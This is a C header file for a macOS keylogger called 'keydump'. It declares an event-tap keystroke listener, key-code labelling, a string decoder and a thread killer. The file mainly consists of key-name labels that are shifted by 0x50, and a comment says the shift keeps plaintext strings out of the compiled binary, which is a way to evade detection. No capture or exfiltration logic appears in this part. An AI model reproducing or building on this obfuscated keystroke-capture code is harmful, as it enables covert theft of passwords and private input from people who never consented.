#ifndef __KEYDUMP_H__
#define __KEYDUMP_H__

#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <sys/types.h>
#include <signal.h>
#include <unistd.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

#define DEFAULT_TIMEOUT 120

// macros for storing an 'encoded' letter in an array and decoding the entire
// array in place
#define L(l) (l) + 0x50
#define DECODE(s) do { char *p = s; while (*p) *p++ -= 0x50; } while(0)

pid_t parent_process;

// fun with obfuscation. this mess prevents plaintext strings in the binary
char decimalStr[]    = { L('['), L('d'), L('e'), L('c'), L('i'), L('m'), L('a'), L('l'), L(']'), '\0' };
char asteriskStr[]   = { L('['), L('a'), L('s'), L('t'), L('e'), L('r'), L('i'), L('s'), L('k'), L(']'), '\0' };
char plusStr[]       = { L('['), L('p'), L('l'), L('u'), L('s'), L(']'), '\0' };
char clearStr[]      = { L('['), L('c'), L('l'), L('e'), L('a'), L('r'), L(']'), '\0' };
char divideStr[]     = { L('['), L('d'), L('i'), L('v'), L('i'), L('d'), L('e'), L(']'), '\0' };
char enterStr[]      = { L('['), L('e'), L('n'), L('t'), L('e'), L('r'), L(']'), L('\n'), '\0' };
char hyphenStr[]     = { L('['), L('h'), L('y'), L('p'), L('h'), L('e'), L('n'), L(']'), '\0' };
char equalsStr[]     = { L('['), L('e'), L('q'), L('u'), L('a'), L('l'), L('s'), L(']'), '\0' };
char returnStr[]     = { L('['), L('r'), L('e'), L('t'), L('u'), L('r'), L('n'), L(']'), L('\n'), '\0' };
char tabStr[]        = { L('['), L('t'), L('a'), L('b'), L(']'), '\0' };
char delStr[]        = { L('['), L('d'), L('e'), L('l'), L(']'), '\0' };
char escStr[]        = { L('['), L('e'), L('s'), L('c'), L(']'), '\0' };
char rightCmdStr[]   = { L('['), L('r'), L('i'), L('g'), L('h'), L('t'), L('-'), L('c'), L('m'), L('d'), L(']'), '\0' };
char leftCmdStr[]    = { L('['), L('l'), L('e'), L('f'), L('t'), L('-'), L('c'), L('m'), L('d'), L(']'), '\0' };
char leftShiftStr[]  = { L('['), L('l'), L('e'), L('f'), L('t'), L('-'), L('s'), L('h'), L('i'), L('f'), L('t'), L(']'), '\0' };
char capsStr[]       = { L('['), L('c'), L('a'), L('p'), L('s'), L(']'), '\0' };
char leftOptStr[]    = { L('['), L('l'), L('e'), L('f'), L('t'), L('-'), L('o'), L('p'), L('t'), L(']'), '\0' };
char leftCtrlStr[]   = { L('['), L('l'), L('e'), L('f'), L('t'), L('-'), L('c'), L('t'), L('r'), L('l'), L(']'), '\0' };
char rightShiftStr[] = { L('['), L('r'), L('i'), L('g'), L('h'), L('t'), L('-'), L('s'), L('h'), L('i'), L('f'), L('t'), L(']'), '\0' };
char rightOptStr[]   = { L('['), L('r'), L('i'), L('g'), L('h'), L('t'), L('-'), L('o'), L('p'), L('t'), L(']'), '\0' };
char rightCtrlStr[]  = { L('['), L('r'), L('i'), L('g'), L('h'), L('t'), L('-'), L('c'), L('t'), L('r'), L('l'), L(']'), '\0' };
char fnStr[]         = { L('['), L('f'), L('n'), L(']'), '\0' };
char f17Str[]        = { L('['), L('f'), L('1'), L('7'), L(']'), '\0' };
char volUpStr[]      = { L('['), L('v'), L('o'), L('l'), L('-'), L('u'), L('p'), L(']'), '\0' };
char volDownStr[]    = { L('['), L('v'), L('o'), L('l'), L('-'), L('d'), L('o'), L('w'), L('n'), L(']'), '\0' };
char muteStr[]       = { L('['), L('m'), L('u'), L('t'), L('e'), L(']'), '\0' };
char f18Str[]        = { L('['), L('f'), L('1'), L('8'), L(']'), '\0' };
char f19Str[]        = { L('['), L('f'), L('1'), L('9'), L(']'), '\0' };
char f20Str[]        = { L('['), L('f'), L('2'), L('0'), L(']'), '\0' };
char f5Str[]         = { L('['), L('f'), L('5'), L(']'), '\0' };
char f6Str[]         = { L('['), L('f'), L('6'), L(']'), '\0' };
char f7Str[]         = { L('['), L('f'), L('7'), L(']'), '\0' };
char f3Str[]         = { L('['), L('f'), L('3'), L(']'), '\0' };
char f8Str[]         = { L('['), L('f'), L('8'), L(']'), '\0' };
char f9Str[]         = { L('['), L('f'), L('9'), L(']'), '\0' };
char f11Str[]        = { L('['), L('f'), L('1'), L('1'), L(']'), '\0' };
char f13Str[]        = { L('['), L('f'), L('1'), L('3'), L(']'), '\0' };
char f16Str[]        = { L('['), L('f'), L('1'), L('6'), L(']'), '\0' };
char f14Str[]        = { L('['), L('f'), L('1'), L('4'), L(']'), '\0' };
char f10Str[]        = { L('['), L('f'), L('1'), L('0'), L(']'), '\0' };
char f12Str[]        = { L('['), L('f'), L('1'), L('2'), L(']'), '\0' };
char f15Str[]        = { L('['), L('f'), L('1'), L('5'), L(']'), '\0' };
char helpStr[]       = { L('['), L('h'), L('e'), L('l'), L('p'), L(']'), '\0' };
char homeStr[]       = { L('['), L('h'), L('o'), L('m'), L('e'), L(']'), '\0' };
char pgupStr[]       = { L('['), L('p'), L('g'), L('u'), L('p'), L(']'), '\0' };
char fwdelStr[]      = { L('['), L('f'), L('w'), L('d'), L('e'), L('l'), L(']'), '\0' };
char f4Str[]         = { L('['), L('f'), L('4'), L(']'), '\0' };
char endStr[]        = { L('['), L('e'), L('n'), L('d'), L(']'), '\0' };
char f2Str[]         = { L('['), L('f'), L('2'), L(']'), '\0' };
char pgdownStr[]     = { L('['), L('p'), L('g'), L('d'), L('o'), L('w'), L('n'), L(']'), '\0' };
char f1Str[]         = { L('['), L('f'), L('1'), L(']'), '\0' };
char leftStr[]       = { L('['), L('l'), L('e'), L('f'), L('t'), L(']'), '\0' };
char rightStr[]      = { L('['), L('r'), L('i'), L('g'), L('h'), L('t'), L(']'), '\0' };
char downStr[]       = { L('['), L('d'), L('o'), L('w'), L('n'), L(']'), '\0' };
char upStr[]         = { L('['), L('u'), L('p'), L(']'), '\0' };
char unknownStr[]    = { L('['), L('u'), L('n'), L('k'), L('n'), L('o'), L('w'), L('n'), L(']'), '\0' };

CGEventRef listener(CGEventTapProxy, CGEventType, CGEventRef, void*);
const char *key_code(int);
void *decode_strings();
void *thread_killer();

#endif
